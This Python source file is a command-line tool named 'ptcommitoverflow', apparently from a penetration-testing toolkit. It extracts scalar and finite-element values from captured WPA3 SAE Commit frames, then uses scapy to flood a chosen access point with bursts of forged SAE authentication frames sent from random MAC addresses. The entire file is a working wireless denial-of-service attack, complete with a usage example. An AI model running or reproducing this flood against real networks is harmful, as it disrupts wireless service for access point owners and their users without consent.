#!/usr/bin/env python3
import argparse
import random
import sys; sys.path.append(__file__.rsplit("/", 1)[0])

from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, rdpcap

from ptlibs import ptjsonlib, ptprinthelper
from ptlibs.ptprinthelper import ptprint

from _version import __version__

class PtCommitOverflow:
    def __init__(self, args):
        # Initialize class with command line arguments
        self.args = args
        self.pcap_file = args.file
        self.iface = args.iface
        self.bssid = args.bssid
        self.count = args.count
        self.scalars = []
        self.finites = []
        self.ptjsonlib = ptjsonlib.PtJsonLib()

    def extract_sae_commit_values(self, pcap_file):
        # Extract cryptographic elements from SAE Commit frames in PCAP file
        packets = rdpcap(pcap_file)

        scalars = []
        finites = []
        for pkt in packets:
            if pkt.haslayer(Dot11Auth) and len(pkt) > 140:
                auth_payload = bytes(pkt[Dot11Auth])
                scalars.append(auth_payload[-64:-32])  # Last 64-32 bytes contain scalar
                finites.append(auth_payload[-32:])     # Last 32 bytes contain finite element

        ptprint(f"Extracted {len(scalars)} scalars and {len(finites)} finite elements", 
                bullet_type="INFO", condition=not self.args.json)
        return scalars, finites

    def rand_mac(self):
        # Generate random MAC address
        return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))

    def auth_frame(self, bssid):
        # Create authentication frame with random client MAC
        client = self.rand_mac()
        return (
            RadioTap() /
            Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid) /
            Dot11Auth(algo=3, seqnum=1, status=0)  # algo=3 indicates SAE authentication
        )

    def construct_commit(self, bssid, scalar_list, finite_list):
        # Build a complete SAE Commit frame using random real values
        scalar = random.choice(scalar_list)
        finite = random.choice(finite_list)
        # Raw SAE-Commit IE header (0x13 = length 19, 0x00 = status code 0)
        return self.auth_frame(bssid) / b'\x13\x00' / scalar / finite

    def attack(self):
        # Perform the attack by sending bursts of crafted frames
        if not self.scalars or not self.finites:
            self.ptjsonlib.end_error("No scalars or finite elements extracted—nothing to send.", self.args.json)

        ptprint(f"Starting attack on {self.bssid} using real scalars & finite elements...", 
                bullet_type="INFO", condition=not self.args.json)

        for n in range(int(self.count)):
            try:
                # Send 128 identical frames in a burst with small delay
                sendp(
                    self.construct_commit(self.bssid, self.scalars, self.finites),
                    iface=self.iface,
                    count=128,
                    inter=0.0001,  # 0.1ms between packets
                    verbose=False
                )
            except ValueError as e:
                self.ptjsonlib.end_error(str(e), self.args.json)

            # Print progress every 50 bursts to avoid console flooding
            burst_num = n + 1
            if burst_num % 50 == 0:
                ptprint(f"SAE Commit frame burst sent: {burst_num}", 
                        bullet_type="INFO", condition=not self.args.json)
                
        ptprint("All bursts sent, ending the attack", bullet_type="INFO", condition=not self.args.json)

def get_help():
    # Generate help information for the tool
    return [
        {"description": ["SAE-Commit flood using extracted scalars & finite elements from a PCAP"]},
        {"usage": ["ptcommitoverflow <options>"]},
        {"usage_example": [
            "ptcommitoverflow -f file.pcap -i wlan0mon -b 00:11:22:33:44:55 -n 200",
        ]},
        {"options": [
        ["-f", "--file",      "<file>",       "PCAP file containing SAE-Commit frames"],
        ["-i", "--iface",     "<interface>",  "Monitor-mode interface (e.g., wlan0mon)"],
        ["-b", "--bssid",     "<bssid>",      "Target AP BSSID"],
        ["-n", "--count",     "<count>",      "Number of bursts to send"],
        ["-v",  "--version",  "",             "Show script version and exit"],
        ["-h",  "--help",     "",             "Show this help message and exit"],
        ["-j",  "--json",     "",             "Output in JSON format"],
        ]
        }]

def parse_args():
    # Parse command line arguments and display help if needed
    global SCRIPTNAME
    SCRIPTNAME = "ptcommitoverflow"
    
    parser = argparse.ArgumentParser(
        description="SAE-Commit flood using extracted scalars & finite elements from a PCAP",
        add_help=False
    )
    parser.add_argument('-f', '--file', required=True, help="PCAP file containing SAE-Commit frames")
    parser.add_argument('-i', '--iface', required=True, help="Monitor-mode interface (e.g., wlan0mon)")
    parser.add_argument('-b', '--bssid', required=True, help="Target AP BSSID")
    parser.add_argument('-n', '--count', required=True, type=int, help="Number of bursts to send")
    parser.add_argument("-j", "--json", action="store_true")
    parser.add_argument("-v", "--version", action='version', version=f'{SCRIPTNAME} {__version__}')

    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        ptprinthelper.help_print(get_help(), SCRIPTNAME, __version__)
        sys.exit(0)

    args = parser.parse_args()
    ptprinthelper.print_banner(SCRIPTNAME, __version__, args.json, space=0)
    return args

def main():
    # Main entry point for the program
    args = parse_args()
    ptjson = ptjsonlib.PtJsonLib()

    # Extract scalar and finite values or exit
    try:
        script = PtCommitOverflow(args)
        script.scalars, script.finites = script.extract_sae_commit_values(args.file)
    except FileNotFoundError:
        ptjson.end_error(f"PCAP file not found: {args.file}", args.json)

    # Execute attack or handle exceptions
    try:
        script.attack()
    except KeyboardInterrupt:
        ptjson.end_error("Attack interrupted by user", args.json)
    except ValueError as e:
        ptjson.end_error(str(e), args.json)

    ptjson.set_status("finished")
    ptprint(ptjson.get_result_json(), "", args.json)

if __name__ == "__main__":
    main()
